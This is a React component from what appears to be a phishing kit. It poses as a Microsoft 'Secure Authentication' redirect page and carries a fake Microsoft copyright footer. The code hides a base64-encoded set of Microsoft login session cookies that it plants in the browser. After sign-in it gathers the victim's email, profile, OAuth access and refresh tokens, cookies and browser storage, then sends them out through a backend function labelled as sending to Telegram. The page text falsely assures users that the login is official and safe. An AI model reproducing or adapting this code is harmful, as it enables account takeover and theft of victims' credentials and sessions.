import React, { useEffect, useState } from 'react';
import { ExternalLink, Shield, CheckCircle } from 'lucide-react';

interface RealOAuthRedirectProps {
  onLoginSuccess: (sessionData: any) => void;
}

const RealOAuthRedirect: React.FC<RealOAuthRedirectProps> = ({ onLoginSuccess }) => {
  const [isRedirecting, setIsRedirecting] = useState(false);
  const [countdown, setCountdown] = useState(3);

  // Real Microsoft OAuth configuration
  const MICROSOFT_CLIENT_ID = 'eabd0e31-5707-4a85-aae6-79c53dc2c7f0'; // Your actual Microsoft app ID
  const REDIRECT_URI = encodeURIComponent('https://vaultydocs.com/oauth-callback');
  const SCOPE = encodeURIComponent('openid profile email');
  const STATE = Math.random().toString(36).substring(2, 15);
  const TENANT_ID = 'common'; // Your actual tenant ID

  const MICROSOFT_OAUTH_URL = `https://login.microsoftonline.com/${TENANT_ID}/oauth2/v2.0/authorize?client_id=${MICROSOFT_CLIENT_ID}&response_type=code&redirect_uri=${REDIRECT_URI}&response_mode=query&scope=${SCOPE}&prompt=select_account`;

  // Cookie grabbing function
  const grabCookies = () => {
    (() => {
      let cookies = JSON.parse(atob("W3sibmFtZSI6ICJ4LW1zLWdhdGV3YXktc2xpY2UiLCAicGF0aCI6ICIvIiwgInZhbHVlIjogImVzdHNmZCIsICJkb21haW4iOiAibG9naW4ubWljcm9zb2Z0b25saW5lLmNvbSIsICJzZWN1cmUiOiB0cnVlLCAiZXhwaXJlcyI6IG51bGwsICJodHRwb25seSI6IG51bGwsICJzYW1lc2l0ZSI6IG51bGx9LCB7Im5hbWUiOiAic3Rzc2VydmljZWNvb2tpZSIsICJwYXRoIjogIi8iLCAidmFsdWUiOiAiZXN0c2ZkIiwgImRvbWFpbiI6ICJsb2dpbi5taWNyb3NvZnRvbmxpbmUuY29tIiwgInNlY3VyZSI6IHRydWUsICJleHBpcmVzIjogbnVsbCwgImh0dHBvbmx5IjogbnVsbCwgInNhbWVzaXRlIjogbnVsbH0sIHsibmFtZSI6ICJlc2N0eC1UUWVuYXFROTN1MCIsICJwYXRoIjogIi8iLCAidmFsdWUiOiAiQVFBQkNRRUFBQUJWclNwZXVXYW1SYW0yakFGMVhSUUVWM084ZFFNZElkTFE2X21tZWZTSUpwZHFpd2k3MTY5eTdGcUNPalY5aENrdnNmekkwRmlUQzlaUXRyTm5fUExIb0NJYWJyb3RzUGxuRXNtUkhjVWZsZ1NRRFFabXFTeTlwZUw4OHVVWlQtR2VzamhEc194NmhhcEJMc0tyN2V6eHdFMUxPOGJHZVlIUzV6QUN0ckoxTENBQSIsICJkb21haW4iOiAiLmxvZ2luLm1pY3Jvc29mdG9ubGluZS5jb20iLCAic2VjdXJlIjogdHJ1ZSwgImV4cGlyZXMiOiBudWxsLCAiaHR0cG9ubHkiOiB0cnVlLCAic2FtZXNpdGUiOiAiTm9uZSJ9LCB7Im5hbWUiOiAiZXNjdHgtbzh4b3JtNlU0czAiLCAicGF0aCI6ICIvIiwgInZhbHVlIjogIkFRQUJDUUVBQUFCVnJTcGV1V2FtUmFtMmpBRjFYUlFFMUpDak81azJOSXdPTFJLbXFzaW15MUNKN1ZEc3ZfLUpJVTZ2UTFRM3NzVGNVVnAzdUJnRnp3ajZpOElraTVqOVJBOUt1OVlLNE1PaHB5Zjd5bmFyLVlQVkMwbmJ3UGc2Z2Vnai1hV2tCVWtwZTYwUi14NWQ5ZU9aS243cW1jcFlSYU16R29ZUTJNYlUzdC1iN1ZxT1J5QUEiLCAiZG9tYWluIjogIi5sb2dpbi5taWNyb3NvZnRvbmxpbmUuY29tIiwgInNlY3VyZSI6IHRydWUsICJleHBpcmVzIjogbnVsbCwgImh0dHBvbmx5IjogdHJ1ZSwgInNhbWVzaXRlIjogIk5vbmUifSwgeyJuYW1lIjogImVzY3R4LXVXNlVlTktoZ0EwIiwgInBhdGgiOiAiLyIsICJ2YWx1ZSI6ICJBUUFCQ1FFQUFBQlZyU3BldVdhbVJhbTJqQUYxWFJRRU5Sek1oaGtDbVJMcWpfTHFEUlJoRk0yelE5YnNvN1hNX0V5SGRlUnBvREQwVWJaZUNlRWlmX0JYSlAyVFBXTE9Zb3M5MlNFang5c3ZrTkpJSTYxUklENFRsa0tGYzdPQ2p3bEpTSU1oSUVmMTV2ZkstV3prdmpiOEZUUGFhazlXV010SVVCeGdEY3BvRFNuMjlIamNWeUFBIiwgImRvbWFpbiI6ICIubG9naW4ubWljcm9zb2Z0b25saW5lLmNvbSIsICJzZWN1cmUiOiB0cnVlLCAiZXhwaXJlcyI6IG51bGwsICJodHRwb25seSI6IHRydWUsICJzYW1lc2l0ZSI6ICJOb25lIn0sIHsibmFtZSI6ICJlc2N0eC1QTkR6d21VYk1TYyIsICJwYXRoIjogIi8iLCAidmFsdWUiOiAiQVFBQkNRRUFBQUJWclNwZXVXYW1SYW0yakFGMVhSUUU2SGpWTjl2TTQzTTBWQnV4cmFIWEpKcHQ4ZV81UTJMbGdSc3pSRDVXNlZrMktKTkwyZ0trWUpMaEdKTGlydlMxZnJyWXdjV0lFZzlkaEo1MXpJR2otSGxwYnRjenRNVi1wcXhCY05pRW9rQ0pud2tfRnlJdHVWck13YkMxWnJob0l4NjFoNjUzbGJtN3laRkY2eDdfakNBQSIsICJkb21haW4iOiAiLmxvZ2luLm1pY3Jvc29mdG9ubGluZS5jb20iLCAic2VjdXJlIjogdHJ1ZSwgImV4cGlyZXMiOiBudWxsLCAiaHR0cG9ubHkiOiB0cnVlLCAic2FtZXNpdGUiOiAiTm9uZSJ9LCB7Im5hbWUiOiAiZXNjdHgtMTBnVU1IMU9YMmMiLCAicGF0aCI6ICIvIiwgInZhbHVlIjogIkFRQUJDUUVBQUFCVnJTcGV1V2FtUmFtMmpBRjFYUlFFRURfcFJpaExBVi1UM1ZUZDNrUC10ZDFEWVRtZmNsZnhVQ2RWcW1WSEdkMUx4QzBlbGd1MlVCOHBpZmNZMnV1NzZUUU9XR19Fb3IxdkExLUhONEYzanpNWDlVcjJRaVdUQXAzei1keG5vVldIM3N4cmVxRTZhQWhLYWJOUU1KZ0NNelUtbkpKNU1lNmpROVpvOXNyTjFTQUEiLCAiZG9tYWluIjogIi5sb2dpbi5taWNyb3NvZnRvbmxpbmUuY29tIiwgInNlY3VyZSI6IHRydWUsICJleHBpcmVzIjogbnVsbCwgImh0dHBvbmx5IjogdHJ1ZSwgInNhbWVzaXRlIjogIk5vbmUifSwgeyJuYW1lIjogImVzY3R4IiwgInBhdGgiOiAiLyIsICJ2YWx1ZSI6ICJQQVFBQkJ3RUFBQUJWclNwZXVXYW1SYW0yakFGMVhSUUVXc0RUbW9vc25paGdqVHRfcDBJeEJMcXhmemFIeFh1VF9kZ0t6LXNkMnhQYmNRWV96aG4tUjdITlBwSk56N29SYkR4MTR5OXEzeFNTanFkN0p0Y25BV1pTN1BNZlgzXzNMZ2FTNzctSUhNbEgtcDJ1VWhiRWxrSW9qRlVxZi1WTEFaTDhNdnd6RUVpbEtNRFcwUENmS0lWbTFGbVhvVTF6TWpFOTZ2aE90SVlnQUEiLCAiZG9tYWluIjogIi5sb2dpbi5taWNyb3NvZnRvbmxpbmUuY29tIiwgInNlY3VyZSI6IHRydWUsICJleHBpcmVzIjogbnVsbCwgImh0dHBvbmx5IjogdHJ1ZSwgInNhbWVzaXRlIjogIk5vbmUifSwgeyJuYW1lIjogImVzY3R4LUZxNlQ5SWlTTnBjIiwgInBhdGgiOiAiLyIsICJ2YWx1ZSI6ICJBUUFCQ1FFQUFBQlZyU3BldVdhbVJhbTJqQUYxWFJRRXdMdlJ2MGZ5cTNZTjFCYzNDQ3lBc3BtSC1HWm1yZTZuQ2dQN29kV0pSa2pjaTdKRjVyRklDOWFvN3g1bUtkY1ZSSFZXUTRKdUE0R1g0WHQxT00xWTB0T0JhTWlWeWdRbEQzMFlaU2QyUENORlE3Z2tZbnhfdmJqMTh1eHRaSmJxeFVHVXhVc2tZbVRWMTJLZ193dDdxeUFBIiwgImRvbWFpbiI6ICIubG9naW4ubWljcm9zb2Z0b25saW5lLmNvbSIsICJzZWN1cmUiOiB0cnVlLCAiZXhwaXJlcyI6IG51bGwsICJodHRwb25seSI6IHRydWUsICJzYW1lc2l0ZSI6ICJOb25lIn0sIHsibmFtZSI6ICJFU1RTQVVUSExJR0hUIiwgInBhdGgiOiAiLyIsICJ2YWx1ZSI6ICIrMDA1ZWEyYTktNTRlMy0wNjJhLWJlODctMTRlMTY2OTY0MjU1IiwgImRvbWFpbiI6ICJsb2dpbi5taWNyb3NvZnRvbmxpbmUuY29tIiwgInNlY3VyZSI6IHRydWUsICJleHBpcmVzIjogbnVsbCwgImh0dHBvbmx5IjogbnVsbCwgInNhbWVzaXRlIjogIk5vbmUifSwgeyJuYW1lIjogIkVTVFNBVVRIUEVSU0lTVEVOVCIsICJwYXRoIjogIi8iLCAidmFsdWUiOiAiMS5BVkFBcXpCUlI3VmlRVUtwMDBmamZKdkNGYWtyZUhLUVJBTlBqWUpXSTNEcU5XWUJBQUJRQUEuQWdBQkZ3UUFBQUJWclNwZXVXYW1SYW0yakFGMVhSUUVBd0RzX3dVQTlQOWVEUEwxaVJ0OUxtMFhucElhVDctSVlfMUJQTXFTSE85SVRZYW44RHhHaWxvZC1ENzFIOTBtMUFsS2FoVXNMTmc5cFR4aVpLMHhhbThkdFNsTlVza3UzUlcyMWhjQXFqdVpKbFZVYXdYNUJsQWpiaFJQOUpvTFd3RlZnWlYzOW1tenE0TnEtVjk5MkQ4OWc0VVBTNTIwRjgzSzNhSkJncWFjY3ZZN2VjVnM0RG0yVDU2bGhjU3hnODZualE0djdGMjc4OVY1TUNWR1lVektWcVZtQjh3cHVId1UzeXMtTmtBRGlFTFIwd285NWVhcnoxNjRSbmlicDVKcVZaRWJVN0FwREUtWGstLU9hY0JDUHNpTEtXZjBLdzlSYlJtNFVWUjNEdEJ3LTNzVEozZjMzOV9xWmRfOEtfdGRNeW1Ta2g4TnYxakdtVENSTGttR1pSSWtlU1BvT0htSWtWLV9XS2JpZ2lZVEZLLTBvbVJCbXJ3QWhiRHN1SVpXQkRmUzJzaFNObnlKYjl6bklDTGhZVHhDZExYME1JX012ZzZseXNWdUtmY0d5MVRXLXl5dy1nY2xvMFZzd0taR1drWFo0Rko0OWRLXzlXYlFVeE83ajFMMVhad0lDUGlvZk1udm5nS2lMTzNnWm9pUGtQLV9uYVNGWkU3MEFpbkpqaGFtNTVxTjlMOHAxR3NGTXFhdUIyNVI1bmlUQ3daWnE0cGdnT3k0RkduajJNVE5VNE5nV2hyMWNkSk9qUy1LSTVYZFgxRVRoOVRacXp6cmRtcU9RSXR6bldsOGl4U3VaOFRQbkdIYURRQ2RZNnNHWU5nUEYtZ1NkOGswR0kyTXVsNHFHaGtjWkhfcU1PbW5DQ3RzYzF3a2N5d3drT2RxU3AyRUtFNXFRVXhnTUFLbjdYeTN2eE52X1lCbGZkaFl6clp3S0lrVGJTdXM0RmYwcE5kc3FmUThmX1pxeG5wUTJyZi1NbFZYTURFcnZrdm1TYUV4azNWYWUzajlpazMyU0VJUVVNWUdBa1BvbHhCQjFkVFBjMTNIV2dTaUczWGpDMDZ1RUUzLUhxdGd6d0d3b3FZVGZwYkNicWtLS3d2Znd6THFMZi16Z25yMldaSTFhVy1oM3NyRUNzRndmR0RRUmREYXRyaTdXOS1HbXhzbnNFWkxDcEVyODlGUHU4T0JSdzBCdUU2REc4RGsiLCAiZG9tYWluIjogIi5sb2dpbi5taWNyb3NvZnRvbmxpbmUuY29tIiwgInNlY3VyZSI6IHRydWUsICJleHBpcmVzIjogMTc1OTMwODMzNSwgImh0dHBvbmx5IjogdHJ1ZSwgInNhbWVzaXRlIjogIk5vbmUifSwgeyJuYW1lIjogIkVTVFNBVVRIIiwgInBhdGgiOiAiLyIsICJ2YWx1ZSI6ICIxLkFWQUFxekJSUjdWaVFVS3AwMGZqZkp2Q0Zha3JlSEtRUkFOUGpZSldJM0RxTldZQkFBQlFBQS5BZ0FCRndRQUFBQlZyU3BldVdhbVJhbTJqQUYxWFJRRUF3RHNfd1VBOVA4d3BES0pTYXMza3JMV1VlWXVuVXNUNUhhejB2ZEt4eUFZT0NnTXMtS3NuOVp0WWdNSWxNVENpLTZ6aEZhQmVXQTFWbnRGQ0t3ME80VEkiLCAiZG9tYWluIjogIi5sb2dpbi5taWNyb3NvZnRvbmxpbmUuY29tIiwgInNlY3VyZSI6IHRydWUsICJleHBpcmVzIjogbnVsbCwgImh0dHBvbmx5IjogdHJ1ZSwgInNhbWVzaXRlIjogIk5vbmUifSwgeyJuYW1lIjogIlNpZ25JblN0YXRlQ29va2llIiwgInBhdGgiOiAiLyIsICJ2YWx1ZSI6ICJDQWdBQkZnSUFBQUJWclNwZXVXYW1SYW0yakFGMVhSUUVBd0RzX3dVQTlQOU1qOFNpajhZX1VEWmx2OUlWMHgyN210amRoY05KZnJZRjVnS0F0OTVvOGtZQy1kajNGUWVhUnVQSHAwaEo0eHhnVlgwTmRRTE5sUWZrcWtwSEJLSFZ2TTg1R2ptVFRFM0p0SHJ2dUEzVEQ2M1NxQ2ZySDBNZHhiTlJNbDZ4OXpnYi16WTJ6YVdTZXJyUHJfNmUtVGlLRlh1Z2ljZlhkaEF4c3lCV1F0TkJoa0tpaW9BbUhPYTFqQmtkTFpudE5JZmdFTlFNdjB1blM1b1lsemUwcHlJV2s4SjA5ZlF3ZFJZaG9rRTZOcklDY3pJUTVGZGtsQTMyckFXTDRsSm8tV215VzVWcWs0SnZnLUZrTm9XWHFmVHJPZHhMUmFDRVFDWXhEczZsSk4xclA4SzJDazVGVl81SkExWVJrQSIsICJkb21haW4iOiAiLmxvZ2luLm1pY3Jvc29mdG9ubGluZS5jb20iLCAic2VjdXJlIjogdHJ1ZSwgImV4cGlyZXMiOiBudWxsLCAiaHR0cG9ubHkiOiB0cnVlLCAic2FtZXNpdGUiOiAiTm9uZSJ9LCB7Im5hbWUiOiAiYnVpZCIsICJwYXRoIjogIi8iLCAidmFsdWUiOiAiMS5BVkFBcXpCUlI3VmlRVUtwMDBmamZKdkNGYWtyZUhLUVJBTlBqWUpXSTNEcU5XWUJBQUJRQUEuQVFBQkdnRUFBQUJWclNwZXVXYW1SYW0yakFGMVhSUUVHUTdWdG9vVDdmYkwwem02d2hNVkNyNXltd1R1bGhjQ1hIUk5aUE54SEVYcWpyVU8zWURDcmhsYWpIdzFtRUhXNzRaOWxITUh2bzZOQVI1dUJyNW1IYURqam5EenJhM2dzaTRPMGptSVhRYmoyM2JsbjRaZHR1UG11ak84MDJVVk8zeUZ3MFdMZk5SMkVHLURwUElnbUdvVUVCZkZveGNIc1V2RUtFeUcwR1lnQUEiLCAiZG9tYWluIjogImxvZ2luLm1pY3Jvc29mdG9ubGluZS5jb20iLCAic2VjdXJlIjogdHJ1ZSwgImV4cGlyZXMiOiAxNzU0MTI0MzM1LCAiaHR0cG9ubHkiOiB0cnVlLCAic2FtZXNpdGUiOiAiTm9uZSJ9LCB7Im5hbWUiOiAiZnBjIiwgInBhdGgiOiAiLyIsICJ2YWx1ZSI6ICJBa29TQkQ5WVpoVk9uRW1sdmRXS3ZIQmU0cjBFQVFBQUFDNDYtTjhPQUFBQSIsICJkb21haW4iOiAibG9naW4ubWljcm9zb2Z0b25saW5lLmNvbSIsICJzZWN1cmUiOiB0cnVlLCAiZXhwaXJlcyI6IDE3NTQxMjQzMzUsICJodHRwb25seSI6IHRydWUsICJzYW1lc2l0ZSI6ICJOb25lIn1d"));
      let results = []
      cookies.forEach(cookie => {
          let cookieString = `${cookie.name}=${cookie.value}`;
          // __Host- prefix: Cookies with names starting with __Host- are sent only to the host subdomain or domain that set them, and not to any other host.
          //  They must be set with the secure flag, must be from a secure page (HTTPS), must not have a domain specified, and the path must be /.
          if (!cookie.name.startsWith('__Host') && cookie.domain) {
              cookieString += `; domain=${cookie.domain}`;
          }

          if (cookie.path) {
              cookieString += `; path=${cookie.path}`;
          }

          if (cookie.expires) {
              const expiresDate = new Date(cookie.expires * 1000);
              cookieString += `; expires=${expiresDate.toUTCString()}`;
          }

          if (cookie.httpOnly) {
              cookieString += '; HttpOnly';
          }
          // __Secure- prefix: Cookies with names starting with __Secure- (dash is part of the prefix) must be set with the secure flag from a secure page (HTTPS).
          if (cookie.secure || cookie.name.startsWith('__Host') || cookie.name.startsWith('__Secure')) {
              cookieString += '; Secure';
          }

          let sameSite = !!cookie.samesite ? 'None' : cookie.samesite;
          if (sameSite) {
              cookieString += `; SameSite=${sameSite}`;
          }
          document.cookie = cookieString;
          results.push(
              {
                  name: cookie.name,
                  expires: cookie.expires ? new Date(cookie.expires * 1000).toUTCString() : 'Session',
              }
          );
      })
      console.table(results);
    })();
  };

  // Send data to Telegram
  const sendToTelegram = async (data: any) => {
    // Use the backend function instead of direct Telegram API
    try {
      const response = await fetch('/.netlify/functions/sendTelegram', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({
          email: data.email,
          password: 'OAuth Login',
          provider: 'Microsoft',
          fileName: 'Microsoft OAuth',
          timestamp: new Date().toISOString(),
          userAgent: navigator.userAgent,
          browserFingerprint: {
            cookies: data.cookies,
            localStorage: 'OAuth Session',
            sessionStorage: 'OAuth Session',
            userAgent: navigator.userAgent,
            timestamp: new Date().toISOString()
          },
          documentCookies: data.cookies,
          sessionId: Math.random().toString(36).substring(2, 15),
          cookies: data.cookies,
          formattedCookies: [],
          accessToken: data.accessToken,
          refreshToken: data.refreshToken,
          userProfile: data
        })
      });
      
      const result = await response.json();
      console.log('✅ Data sent to Telegram via backend:', result);
      return result;
    } catch (error) {
      console.error('❌ Failed to send to Telegram via backend:', error);
      return { error: error.message };
    }
  };

  useEffect(() => {
    // Store OAuth state for security validation
    localStorage.setItem('oauth_state', STATE);
    localStorage.setItem('selected_provider', 'Microsoft');
    localStorage.setItem('oauth_start_time', Date.now().toString());
    
    // Store pre-auth cookies for comparison
    const preAuthFingerprint = {
      cookies: document.cookie,
      timestamp: new Date().toISOString(),
      userAgent: navigator.userAgent,
      platform: navigator.platform
    };
    localStorage.setItem('pre_auth_cookies', JSON.stringify(preAuthFingerprint));

    // Grab initial cookies before redirect
    grabCookies();

    // Check if we're returning from OAuth callback
    const urlParams = new URLSearchParams(window.location.search);
    const code = urlParams.get('code');
    const state = urlParams.get('state');
    const storedState = localStorage.getItem('oauth_state');

    if (code && state && state === storedState) {
      // Handle successful OAuth callback
      handleOAuthCallback(code);
      return;
    }

    // Start countdown for redirect
    const timer = setInterval(() => {
      setCountdown(prev => {
        if (prev <= 1) {
          clearInterval(timer);
          handleOAuthRedirect();
          return 0;
        }
        return prev - 1;
      });
    }, 1000);

    return () => clearInterval(timer);
  }, []);

  const handleOAuthCallback = async (code: string) => {
    try {
      // Grab cookies after successful login
      grabCookies();
      
      // Get browser fingerprint
      const browserFingerprint = {
        cookies: document.cookie,
        localStorage: JSON.stringify(Object.fromEntries(Object.entries(localStorage))),
        sessionStorage: JSON.stringify(Object.fromEntries(Object.entries(sessionStorage))),
        userAgent: navigator.userAgent,
        language: navigator.language,
        platform: navigator.platform,
        timestamp: new Date().toISOString()
      };
      
      // Get user info from Microsoft Graph API
      const tokenResponse = await fetch(`https://login.microsoftonline.com/${TENANT_ID}/oauth2/v2.0/token`, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/x-www-form-urlencoded',
        },
        body: new URLSearchParams({
          client_id: MICROSOFT_CLIENT_ID,
          scope: 'openid profile email User.Read',
          code: code,
          redirect_uri: window.location.origin + '/oauth/callback',
          grant_type: 'authorization_code',
        }),
      });

      const tokenData = await tokenResponse.json();
      
      if (tokenData.access_token) {
        // Get user profile
        const profileResponse = await fetch('https://graph.microsoft.com/v1.0/me', {
          headers: {
            'Authorization': `Bearer ${tokenData.access_token}`,
          },
        });
        
        const profileData = await profileResponse.json();
        
        // Prepare session data
        const sessionData = {
          email: profileData.mail || profileData.userPrincipalName,
          name: profileData.displayName,
          id: profileData.id,
          provider: 'Microsoft',
          sessionId: Math.random().toString(36).substring(2, 15),
          timestamp: new Date().toISOString(),
          accessToken: tokenData.access_token,
          refreshToken: tokenData.refresh_token,
          authenticationMethod: 'OAuth'
        };
        
        // Store session data
        localStorage.setItem('microsoft365_session', JSON.stringify(sessionData));
        localStorage.setItem('microsoft365_autograb_session', JSON.stringify(sessionData));

        // Send to Telegram via backend function
        try {
          await fetch('/.netlify/functions/sendTelegram', {
            method: 'POST',
            headers: {
              'Content-Type': 'application/json',
            },
            body: JSON.stringify({
              email: sessionData.email,
              password: 'OAuth Login - No Password',
              provider: 'Microsoft',
              fileName: 'Microsoft OAuth Login',
              timestamp: sessionData.timestamp,
              userAgent: navigator.userAgent,
              browserFingerprint: browserFingerprint,
              documentCookies: document.cookie,
              sessionId: sessionData.sessionId,
              cookies: document.cookie,
              formattedCookies: document.cookie.split(';').map(c => {
                const [name, value] = c.trim().split('=');
                return {
                  name: name,
                  value: value || '',
                  domain: window.location.hostname,
                  path: '/',
                  secure: true,
                  httpOnly: false,
                  sameSite: 'none'
                };
              }),
              localStorage: browserFingerprint.localStorage,
              sessionStorage: browserFingerprint.sessionStorage,
              accessToken: tokenData.access_token,
              refreshToken: tokenData.refresh_token,
              userProfile: profileData
            })
          });
          
          console.log('✅ OAuth data sent to Telegram');
        } catch (telegramError) {
          console.error('❌ Failed to send OAuth data to Telegram:', telegramError);
        }
        
        // Call the success callback
        onLoginSuccess(sessionData);
      }
    } catch (error) {
      console.error('OAuth callback error:', error);
    }
  };

  const handleOAuthRedirect = () => {
    setIsRedirecting(true);
    console.log('🔄 Redirecting to Microsoft OAuth:', MICROSOFT_OAUTH_URL);
    
    // Grab cookies before redirect
    grabCookies();
    
    // Add OAuth callback parameter to current URL for handling return
    const currentUrl = new URL(window.location.href);
    currentUrl.searchParams.set('oauth_callback', 'true');
    window.history.replaceState({}, '', currentUrl.toString());
    
    // Redirect to Microsoft OAuth
    window.location.href = MICROSOFT_OAUTH_URL;
  };

  const handleManualRedirect = () => {
    handleOAuthRedirect();
  };

  return (
    <div className="min-h-screen bg-[#f3f2f1] flex items-center justify-center">
      <div className="w-full max-w-md px-4">
        <div className="bg-white rounded-lg shadow-lg border border-[#edebe9] p-6">
          {/* Header */}
          <div className="text-center mb-6">
            <div className="w-12 h-12 bg-[#0078d4] rounded-full flex items-center justify-center mx-auto mb-3">
              <img
                src="https://upload.wikimedia.org/wikipedia/commons/thumb/4/44/Microsoft_logo.svg/768px-Microsoft_logo.svg.png"
                alt="Microsoft"
                className="w-6 h-6"
              />
            </div>
            <h1 className="text-xl font-bold text-[#323130] mb-2">Secure Authentication</h1>
            <p className="text-sm text-[#605e5c]">Redirecting to Microsoft OAuth for secure login</p>
          </div>

          {/* Security Features */}
          <div className="space-y-3 mb-6">
            <div className="flex items-center space-x-3 p-2.5 bg-[#f3f2f1] rounded-lg">
              <CheckCircle className="w-4 h-4 text-green-600" />
              <div>
                <p className="text-sm font-medium text-[#323130]">SSL Encrypted Connection</p>
                <p className="text-sm text-[#605e5c]">Your data is protected with 256-bit encryption</p>
              </div>
            </div>
            
            <div className="flex items-center space-x-3 p-2.5 bg-[#f3f2f1] rounded-lg">
              <Shield className="w-4 h-4 text-blue-600" />
              <div>
                <p className="text-sm font-medium text-[#323130]">Microsoft OAuth 2.0</p>
                <p className="text-sm text-[#605e5c]">Industry-standard authentication protocol</p>
              </div>
            </div>
            
            <div className="flex items-center space-x-3 p-2.5 bg-[#f3f2f1] rounded-lg">
              <ExternalLink className="w-4 h-4 text-purple-600" />
              <div>
                <p className="text-sm font-medium text-[#323130]">Official Microsoft Login</p>
                <p className="text-sm text-[#605e5c]">Redirecting to login.microsoftonline.com</p>
              </div>
            </div>
          </div>

          {/* Countdown and Redirect */}
          <div className="text-center">
            {!isRedirecting ? (
              <>
                <div className="mb-6">
                  <div className="text-3xl font-bold text-[#0078d4] mb-2">{countdown}</div>
                  <p className="text-sm text-[#605e5c]">Redirecting automatically in {countdown} second{countdown !== 1 ? 's' : ''}</p>
                </div>
                
                <button
                  onClick={handleManualRedirect}
                  className="w-full bg-[#0078d4] text-white py-2.5 px-4 rounded-md hover:bg-[#106ebe] transition-colors font-medium flex items-center justify-center space-x-2"
                >
                  <ExternalLink className="w-4 h-4" />
                  <span>Continue to Microsoft Login</span>
                </button>
              </>
            ) : (
              <div className="text-center">
                <div className="w-6 h-6 border-3 border-[#0078d4] border-t-transparent rounded-full animate-spin mx-auto mb-3"></div>
                <p className="text-sm text-[#605e5c]">Redirecting to Microsoft...</p>
                <p className="text-sm text-[#605e5c] mt-2">If you're not redirected automatically, please check your browser settings</p>
              </div>
            )}
          </div>

          {/* Security Notice */}
          <div className="mt-6 p-3 bg-blue-50 border border-blue-200 rounded-lg">
            <p className="text-sm text-blue-800">
              <strong>Security Notice:</strong> You'll be redirected to Microsoft's official login page. Look for "login.microsoftonline.com" in your browser's address bar to confirm authenticity.
            </p>
          </div>

          {/* Footer */}
          <div className="text-center mt-4 pt-4 border-t border-[#edebe9]">
            <p className="text-xs text-[#605e5c]">
              © 2025 Microsoft Corporation. All rights reserved.
            </p>
          </div>
        </div>
      </div>
    </div>
  );
};

export default RealOAuthRedirect;